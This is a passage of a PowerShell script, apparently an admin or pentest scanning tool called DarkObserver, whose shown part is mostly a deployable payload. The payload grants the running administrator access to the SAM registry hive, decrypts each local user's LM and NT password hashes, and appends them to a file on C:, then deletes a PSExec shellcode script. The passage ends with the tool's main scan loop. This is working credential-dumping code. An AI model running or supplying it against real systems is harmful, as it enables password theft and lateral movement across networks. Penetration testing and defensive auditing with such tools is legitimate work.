$aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0"); 
$anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0"); 
$k = Get-Item HKLM:\SAM\SAM\Domains\Account; 
if (-not $k) {return $null} 
[byte[]]$F = $k.GetValue("F"); 
if (-not $F) {return $null} 
$rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $aqwerty + $bootkey + $anum); 
$rc4 = NewRC4 $rc4key; 
return ,($rc4.encrypt($F[0x80..0x9F])); 
} 
 
function Get-UserName([byte[]]$V) 
{ 
if (-not $V) {return $null}; 
$offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC; 
$len = [BitConverter]::ToInt32($V[0x10..0x13],0); 
return [Text.Encoding]::Unicode.GetString($V, $offset, $len); 
} 
 
function Get-UserHashes($u, [byte[]]$hbootkey) 
{ 
[byte[]]$enc_lm_hash = $null; [byte[]]$enc_nt_hash = $null; 
 
# check if hashes exist (if byte memory equals to 20, then we've got a hash) 
$LM_exists = $false; 
$NT_exists = $false; 
# LM header check 
if ($u.V[0xa0..0xa3] -eq 20) 
{ 
$LM_exists = $true; 
} 
# NT header check 
elseif ($u.V[0xac..0xaf] -eq 20) 
{ 
$NT_exists = $true; 
} 
 
if ($LM_exists -eq $true) 
{ 
$lm_hash_offset = $u.HashOffset + 4; 
$nt_hash_offset = $u.HashOffset + 8 + 0x10; 
$enc_lm_hash = $u.V[$($lm_hash_offset)..$($lm_hash_offset+0x0f)]; 
$enc_nt_hash = $u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)]; 
} 
 
elseif ($NT_exists -eq $true) 
{ 
$nt_hash_offset = $u.HashOffset + 8; 
$enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)]; 
} 
return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey); 
} 
 
function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey) 
{ 
[byte[]]$lmhash = $empty_lm; [byte[]]$nthash=$empty_nt; 
# LM Hash 
if ($enc_lm_hash) 
{ 
$lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword; 
} 
 
# NT Hash 
if ($enc_nt_hash) 
{ 
$nthash = DecryptSingleHash $rid $hbootkey $enc_nt_hash $antpassword; 
} 
 
return ,($lmhash,$nthash) 
} 
 
function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr) 
{ 
$deskeys = sid_to_key $rid; 
$md5 = [Security.Cryptography.MD5]::Create(); 
$rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr); 
$rc4 = NewRC4 $rc4_key; 
$obfkey = $rc4.encrypt($enc_hash); 
$hash = (des_decrypt $obfkey[0..7] $deskeys[0]) + 
(des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]); 
return ,$hash; 
} 
 
function Get-UserKeys 
{ 
ls HKLM:\SAM\SAM\Domains\Account\Users | 
where {$_.PSChildName -match "^[0-9A-Fa-f]{8}$"} | 
Add-Member AliasProperty KeyName PSChildName -PassThru | 
Add-Member ScriptProperty Rid {[Convert]::ToInt32($this.PSChildName, 16)} -PassThru | 
Add-Member ScriptProperty V {[byte[]]($this.GetValue("V"))} -PassThru | 
Add-Member ScriptProperty UserName {Get-UserName($this.GetValue("V"))} -PassThru | 
Add-Member ScriptProperty HashOffset {[BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f],0) + 0xCC} -PassThru 
} 
 
function DumpHashes 
{ 
LoadApi 
$bootkey = Get-BootKey; 
$hbootKey = Get-HBootKey $bootkey; 
Get-UserKeys | %{ 
$hashes = Get-UserHashes $_ $hBootKey; 
"{0}:{1}:{2}:{3}" -f ($_.UserName,$_.Rid, 
[BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(), #LM hash
[BitConverter]::ToString($hashes[1]).Replace("-","").ToLower()); #NT hash
} 
} 
 
#http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060 
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) 
{ 
Return 
}  
else 
{ 
#Set permissions for the current user. 
$rule = New-Object System.Security.AccessControl.RegistryAccessRule ( 
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name, 
"FullControl", 
[System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit", 
[System.Security.AccessControl.PropagationFlags]"None", 
[System.Security.AccessControl.AccessControlType]"Allow") 
$key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey( 
"SAM\SAM\Domains", 
[Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, 
[System.Security.AccessControl.RegistryRights]::ChangePermissions) 
$acl = $key.GetAccessControl() 
$acl.SetAccessRule($rule) 
$key.SetAccessControl($acl) 
 
DumpHashes 
 
#Remove the permissions added above. 
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name 
$acl.Access | where {$_.IdentityReference.Value -eq $user} | %{$acl.RemoveAccessRule($_)} | Out-Null 
Set-Acl HKLM:\SAM\SAM\Domains $acl 
} 
} 

Get-PassHashes |%{
	$HashString = $_.replace(":", ",")
	"$env:computername,$HashString" | Add-Content "C:\HashDump392125281"
}
Remove-Item -Force "C:\PSExecShellCode.ps1"
}

############################################
#END Script Blocks for Deployable payloads
############################################

$scan.mtx = New-Object System.Threading.Mutex($false, "MyMutex")

$today = (get-date).ToString("ddMMMyy") #used for creation of temp directory
$FirstRunComps=$true #computer list has not been generated yet
$ScanChoiceArray = New-Object System.Collections.ArrayList #array to hold scan choices
$PSScriptRoot = Split-Path -Parent -Path $MyInvocation.MyCommand.Definition #location of script

#Store current console colors to reset when script exits
$BackgroundColor = [console]::BackgroundColor  
$ForegroundColor = [Console]::ForegroundColor 

############################################
####	 END Initialize Variables       ####
############################################


############################################
####	  Begin Script Execution        ####
############################################

CheckDependancies $PSScriptRoot
[console]::BackgroundColor = "Black"
[Console]::ForegroundColor = "White"
Resize
Clear-Host
AsciiArt
SetKnownGood
while($true)
{
	DarkObserver
	$ScanChoiceArray.Clear()
	try {
		if (Test-Path $TEMP_DIR -ErrorAction Stop){
			Remove-Item -Recurse -Force "$TEMP_DIR"
		}
	} catch {}
}
$scan.mtx=$null
Clear-Host



